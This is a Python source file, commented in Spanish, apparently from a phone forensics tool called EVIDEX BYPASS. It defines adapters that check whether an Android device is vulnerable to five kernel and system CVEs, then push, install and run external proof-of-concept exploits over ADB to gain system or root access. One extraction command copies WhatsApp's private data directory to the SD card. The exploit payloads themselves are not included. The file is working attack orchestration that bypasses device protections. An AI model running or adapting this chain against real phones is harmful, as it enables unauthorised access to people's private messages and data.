#!/usr/bin/env python3
"""
adapters/cve_adapters.py — Adaptadores concretos de CVE para EVIDEX BYPASS
===========================================================================
Cada clase implementa _ejecutar_poc() para un CVE especifico.

IMPORTANTE: estos adaptadores NO contienen el codigo del exploit.
El PoC externo debe descargarse del repositorio oficial listado en
cves.json y colocarse en adapters/pocs/<CVE_ID>/ antes de usar.

La ejecucion del PoC se realiza via ADB push + ADB shell, registrando
cada paso en el log de cadena de custodia.
"""

import logging
import subprocess
from pathlib import Path

from .base import (
    CVEAdapter, NivelAcceso, run_adb
)

logger = logging.getLogger("evidex.pe.adapters")


# ─── CVE-2024-0044 ────────────────────────────────────────────────────────────

class CVE_2024_0044(CVEAdapter):
    """
    CVE-2024-0044 — createSessionInternal path traversal
    Android 12-14, parcheado en 2024-03.

    Mecanismo: la vulnerabilidad en PackageInstallerSession permite a una
    app con permiso INSTALL_PACKAGES (o depuracion USB activa) ejecutar
    comandos arbitrarios como el sistema, logrando acceso completo a
    /data/data/ sin root de kernel.

    PoC publico: https://github.com/metafoxxx/cve-2024-0044
    Colocar el contenido del repositorio en: adapters/pocs/CVE-2024-0044/
    """
    CVE_ID         = "CVE-2024-0044"
    ANDROID_MIN    = "12"
    ANDROID_MAX    = "14"
    PARCHE_FECHA   = "2024-03-01"
    NIVEL_ESPERADO = NivelAcceso.SYSTEM
    TIMEOUT_SEG    = 90

    def _poc_url(self):
        return "https://github.com/metafoxxx/cve-2024-0044"

    def _verificar_precondiciones(self, session):
        ok, msg = super()._verificar_precondiciones(session)
        if not ok:
            return ok, msg

        android = session.get("android_version", "")
        major = int(android.split(".")[0]) if android else 0
        if major < 12 or major > 14:
            return False, f"Android {android} fuera del rango afectado (12-14)."

        # CVE-2024-0044 requiere ADB habilitado (depuracion USB)
        stdout, _, rc = run_adb(["shell", "getprop", "persist.sys.usb.config"],
                                 self.serial)
        if "adb" not in stdout.lower():
            return False, (
                "CVE-2024-0044 requiere depuracion USB activa. "
                f"usb.config actual: '{stdout}'. "
                "Habilitar en Opciones de desarrollador si el equipo esta desbloqueado."
            )
        return True, "OK"

    def _ejecutar_poc(self, session) -> str:
        """
        Ejecuta el PoC de CVE-2024-0044.

        El PoC instala un APK especialmente construido que explota
        createSessionInternal para obtener acceso de sistema.

        Pasos:
          1. Push del APK malicioso al dispositivo
          2. Instalacion via pm install
          3. Lanzamiento del exploit
          4. Esperar shell de sistema
        """
        poc_dir = self.POC_DIR / self.CVE_ID
        apk_files = list(poc_dir.glob("*.apk"))
        if not apk_files:
            return "ERROR: no se encontro archivo .apk en el directorio del PoC."

        apk = apk_files[0]
        self.resultado.poc_version = apk.stem
        log = []

        log.append(f"[+] PoC APK: {apk.name}")
        log.append(f"[+] Hash APK: {self.resultado.poc_hash[:16]}...")

        # Push
        log.append("[*] Instalando APK en el dispositivo...")
        stdout, stderr, rc = run_adb(
            ["install", "-r", str(apk)], self.serial, timeout=60
        )
        log.append(f"    install → rc={rc} stdout='{stdout}' stderr='{stderr}'")
        if rc != 0:
            log.append("[-] Instalacion fallida.")
            return "\n".join(log)

        # Lanzar exploit — el nombre del componente depende del PoC especifico
        # (ver README del repositorio del PoC)
        log.append("[*] Lanzando exploit...")
        stdout, stderr, rc = run_adb(
            ["shell", "am", "start", "-n",
             "com.example.cve_2024_0044/.MainActivity"],
            self.serial, timeout=self.TIMEOUT_SEG
        )
        log.append(f"    am start → rc={rc} stdout='{stdout}'")

        # Esperar a que el exploit establezca el canal
        import time; time.sleep(5)

        # Verificar si se obtuvo shell de sistema
        stdout2, _, _ = run_adb(["shell", "id"], self.serial)
        log.append(f"[*] id post-exploit: {stdout2}")

        return "\n".join(log)

    def _construir_comando_extraccion(self, nivel):
        # CVE-2024-0044 da acceso de sistema, no root de kernel
        # Se puede leer /data/data/ directamente con run-as o cp como system
        return (
            "adb shell 'am startservice "
            "-n com.example.cve_2024_0044/.ExtractService "
            "--es path /data/data/com.whatsapp --es out /sdcard/wa_evidex'"
        )


# ─── CVE-2019-2215 ────────────────────────────────────────────────────────────

class CVE_2019_2215(CVEAdapter):
    """
    CVE-2019-2215 — Binder UAF (use-after-free)
    Android 7-9, parcheado en 2019-10.

    Mecanismo: use-after-free en el driver Binder del kernel.
    El exploit usa el UAF para escribir en memoria del kernel y
    obtener root (uid=0) desde una app o shell sin privilegios.

    PoC publico: https://github.com/jann2005/binder_uaf
    Colocar el contenido en: adapters/pocs/CVE-2019-2215/
    """
    CVE_ID         = "CVE-2019-2215"
    ANDROID_MIN    = "7.0"
    ANDROID_MAX    = "9.0"
    PARCHE_FECHA   = "2019-10-01"
    NIVEL_ESPERADO = NivelAcceso.ROOT
    TIMEOUT_SEG    = 120

    def _poc_url(self):
        return "https://github.com/jann2005/binder_uaf"

    def _verificar_precondiciones(self, session):
        ok, msg = super()._verificar_precondiciones(session)
        if not ok:
            return ok, msg

        android = session.get("android_version","")
        try:
            major = float(android.split(".")[0])
            if not (7 <= major <= 9):
                return False, f"Android {android} fuera del rango afectado (7.x-9.x)."
        except (ValueError, IndexError):
            pass

        # Verificar ADB disponible y arquitectura
        stdout, _, rc = run_adb(
            ["shell", "getprop", "ro.product.cpu.abi"], self.serial
        )
        if "arm64" not in stdout and "armeabi" not in stdout:
            return False, f"Arquitectura '{stdout}' no soportada por el PoC."

        return True, "OK"

    def _ejecutar_poc(self, session) -> str:
        """
        Ejecuta el binario compilado del PoC de CVE-2019-2215.

        El PoC es un binario ELF ARM64 que explota el UAF del Binder.
        Debe compilarse para arm64-v8a antes de usar.
        Ver README del repositorio para instrucciones de compilacion.

        Pasos:
          1. Push del binario al directorio tmp del dispositivo
          2. Dar permisos de ejecucion
          3. Ejecutar y capturar resultado
        """
        poc_dir = self.POC_DIR / self.CVE_ID

        # Buscar binario compilado (arm64 preferido)
        binario = None
        for nombre in ("poc_arm64", "poc", "exploit", "binder_uaf"):
            candidato = poc_dir / nombre
            if candidato.exists():
                binario = candidato
                break

        if not binario:
            return (
                "ERROR: binario del PoC no encontrado en "
                f"{poc_dir}. Compilar primero con NDK para arm64-v8a."
            )

        self.resultado.poc_version = binario.name
        log = []
        log.append(f"[+] Binario PoC: {binario.name}")
        log.append(f"[+] Hash: {self.resultado.poc_hash[:16]}...")

        # Push al dispositivo
        remote = "/data/local/tmp/evidex_poc"
        log.append(f"[*] Push a {remote}...")
        _, _, rc = run_adb(
            ["push", str(binario), remote], self.serial, timeout=30
        )
        if rc != 0:
            log.append("[-] Push fallido.")
            return "\n".join(log)

        # Permisos
        run_adb(["shell", f"chmod +x {remote}"], self.serial)

        # Ejecutar
        log.append("[*] Ejecutando exploit (puede tardar hasta 60s)...")
        stdout, stderr, rc = run_adb(
            ["shell", remote], self.serial, timeout=self.TIMEOUT_SEG
        )
        log.append(f"    stdout: {stdout[:200]}")
        if stderr:
            log.append(f"    stderr: {stderr[:100]}")

        return "\n".join(log)


# ─── CVE-2021-39793 ───────────────────────────────────────────────────────────

class CVE_2021_39793(CVEAdapter):
    """
    CVE-2021-39793 — MediaTek CMDQ driver OOB write
    Android 9-11 con chipsets MediaTek, parcheado en 2022-03.

    Mecanismo: out-of-bounds write en el driver CMDQ de MediaTek.
    Especifico para chipsets MT afectados (MT6762, MT6739, MT6765, etc.)

    PoC publico: https://github.com/google/security-research
    Colocar contenido en: adapters/pocs/CVE-2021-39793/
    """
    CVE_ID         = "CVE-2021-39793"
    ANDROID_MIN    = "9.0"
    ANDROID_MAX    = "11"
    PARCHE_FECHA   = "2022-03-01"
    NIVEL_ESPERADO = NivelAcceso.ROOT
    TIMEOUT_SEG    = 120

    CHIPSETS_AFECTADOS = [
        "mt6762","mt6739","mt6765","mt6768","mt6771"
    ]

    def _poc_url(self):
        return "https://github.com/google/security-research/tree/main/pocs/android"

    def _verificar_precondiciones(self, session):
        ok, msg = super()._verificar_precondiciones(session)
        if not ok:
            return ok, msg

        platform = session.get("board_platform","").lower()
        if not any(c in platform for c in self.CHIPSETS_AFECTADOS):
            return False, (
                f"Chipset '{platform}' no esta en la lista de afectados por "
                f"CVE-2021-39793. Afectados: {self.CHIPSETS_AFECTADOS}"
            )

        android = session.get("android_version","")
        try:
            major = int(android.split(".")[0])
            if not (9 <= major <= 11):
                return False, f"Android {android} fuera del rango (9-11)."
        except (ValueError, IndexError):
            pass

        # Verificar que el driver CMDQ existe
        stdout, _, _ = run_adb(
            ["shell", "ls /dev/cmdq"], self.serial
        )
        if "No such file" in stdout or not stdout:
            return False, "Driver CMDQ no encontrado en /dev/cmdq."

        return True, "OK"

    def _ejecutar_poc(self, session) -> str:
        """
        Ejecuta el PoC del driver CMDQ de MediaTek.

        El PoC aprovecha el OOB write para corrompir estructuras
        del kernel y obtener root en chipsets MediaTek afectados.
        """
        poc_dir = self.POC_DIR / self.CVE_ID
        binario = None
        for nombre in ("poc_mediatek", "poc_cmdq", "exploit", "poc"):
            c = poc_dir / nombre
            if c.exists():
                binario = c
                break

        if not binario:
            return (
                f"ERROR: binario no encontrado en {poc_dir}. "
                "Compilar con NDK para arm64-v8a."
            )

        self.resultado.poc_version = binario.name
        log = [f"[+] Binario: {binario.name}", f"[+] Hash: {self.resultado.poc_hash[:16]}..."]

        remote = "/data/local/tmp/evidex_poc_mt"
        _, _, rc = run_adb(["push", str(binario), remote], self.serial, 30)
        if rc != 0:
            log.append("[-] Push fallido.")
            return "\n".join(log)

        run_adb(["shell", f"chmod +x {remote}"], self.serial)
        log.append("[*] Ejecutando exploit MediaTek CMDQ...")
        stdout, stderr, rc = run_adb(
            ["shell", remote], self.serial, self.TIMEOUT_SEG
        )
        log.append(f"    stdout: {stdout[:200]}")
        return "\n".join(log)


# ─── CVE-2020-0423 ────────────────────────────────────────────────────────────

class CVE_2020_0423(CVEAdapter):
    """
    CVE-2020-0423 — Binder use-after-free (kernel 4.14)
    Android 8-10, parcheado en 2020-10.

    Mecanismo: UAF en el controlador Binder del kernel 4.14.
    Similar a CVE-2019-2215 pero afecta una version posterior del kernel.

    PoC publico: https://github.com/google/security-research
    Colocar contenido en: adapters/pocs/CVE-2020-0423/
    """
    CVE_ID         = "CVE-2020-0423"
    ANDROID_MIN    = "8.0"
    ANDROID_MAX    = "10"
    PARCHE_FECHA   = "2020-10-01"
    NIVEL_ESPERADO = NivelAcceso.ROOT
    TIMEOUT_SEG    = 120

    def _poc_url(self):
        return "https://github.com/google/security-research/tree/main/pocs/android"

    def _verificar_precondiciones(self, session):
        ok, msg = super()._verificar_precondiciones(session)
        if not ok:
            return ok, msg
        android = session.get("android_version","")
        try:
            major = float(android.split(".")[0])
            if not (8 <= major <= 10):
                return False, f"Android {android} fuera del rango (8-10)."
        except (ValueError, IndexError):
            pass
        return True, "OK"

    def _ejecutar_poc(self, session) -> str:
        poc_dir = self.POC_DIR / self.CVE_ID
        binario = None
        for nombre in ("poc_binder", "poc", "exploit"):
            c = poc_dir / nombre
            if c.exists():
                binario = c
                break
        if not binario:
            return f"ERROR: binario no encontrado en {poc_dir}."

        self.resultado.poc_version = binario.name
        log = [f"[+] Binario: {binario.name}"]
        remote = "/data/local/tmp/evidex_poc_binder"
        _, _, rc = run_adb(["push", str(binario), remote], self.serial, 30)
        if rc != 0:
            log.append("[-] Push fallido.")
            return "\n".join(log)
        run_adb(["shell", f"chmod +x {remote}"], self.serial)
        log.append("[*] Ejecutando exploit Binder UAF...")
        stdout, _, _ = run_adb(["shell", remote], self.serial, self.TIMEOUT_SEG)
        log.append(f"    stdout: {stdout[:200]}")
        return "\n".join(log)


# ─── CVE-2022-38181 ───────────────────────────────────────────────────────────

class CVE_2022_38181(CVEAdapter):
    """
    CVE-2022-38181 — ARM Mali GPU use-after-free
    Android 10-12 con GPU Mali, parcheado en 2022-10.

    Aplica a chipsets Exynos y MediaTek con GPU Mali integrada.

    PoC publico: https://github.com/google/security-research
    Colocar contenido en: adapters/pocs/CVE-2022-38181/
    """
    CVE_ID         = "CVE-2022-38181"
    ANDROID_MIN    = "10"
    ANDROID_MAX    = "12"
    PARCHE_FECHA   = "2022-10-01"
    NIVEL_ESPERADO = NivelAcceso.ROOT
    TIMEOUT_SEG    = 120

    # Chipsets con GPU Mali
    CHIPSETS_MALI = [
        "exynos7570","exynos7870","exynos7884","exynos7904",
        "exynos9610","exynos9611","mt6762","mt6739","mt6765",
        "mt6768","mt6771"
    ]

    def _poc_url(self):
        return "https://github.com/google/security-research/tree/main/pocs/android"

    def _verificar_precondiciones(self, session):
        ok, msg = super()._verificar_precondiciones(session)
        if not ok:
            return ok, msg

        platform = session.get("board_platform","").lower()
        if not any(c in platform for c in self.CHIPSETS_MALI):
            return False, (
                f"Chipset '{platform}' no tiene GPU Mali o no esta en lista afectada."
            )
        return True, "OK"

    def _ejecutar_poc(self, session) -> str:
        poc_dir = self.POC_DIR / self.CVE_ID
        binario = None
        for nombre in ("poc_mali","poc","exploit"):
            c = poc_dir / nombre
            if c.exists():
                binario = c
                break
        if not binario:
            return f"ERROR: binario no encontrado en {poc_dir}."

        self.resultado.poc_version = binario.name
        log = [f"[+] Binario: {binario.name}"]
        remote = "/data/local/tmp/evidex_poc_mali"
        _, _, rc = run_adb(["push", str(binario), remote], self.serial, 30)
        if rc != 0:
            return "\n".join(log + ["[-] Push fallido."])
        run_adb(["shell", f"chmod +x {remote}"], self.serial)
        log.append("[*] Ejecutando exploit Mali GPU UAF...")
        stdout, _, _ = run_adb(["shell", remote], self.serial, self.TIMEOUT_SEG)
        log.append(f"    stdout: {stdout[:200]}")
        return "\n".join(log)


# ─── Registro de adaptadores ──────────────────────────────────────────────────

ADAPTADORES = {
    "CVE-2024-0044":  CVE_2024_0044,
    "CVE-2019-2215":  CVE_2019_2215,
    "CVE-2021-39793": CVE_2021_39793,
    "CVE-2020-0423":  CVE_2020_0423,
    "CVE-2022-38181": CVE_2022_38181,
}


def obtener_adaptador(cve_id: str, serial=None):
    """Factory: devuelve una instancia del adaptador para el CVE dado."""
    cls = ADAPTADORES.get(cve_id)
    if cls is None:
        raise ValueError(
            f"No hay adaptador implementado para {cve_id}. "
            f"Disponibles: {list(ADAPTADORES.keys())}"
        )
    return cls(serial=serial)
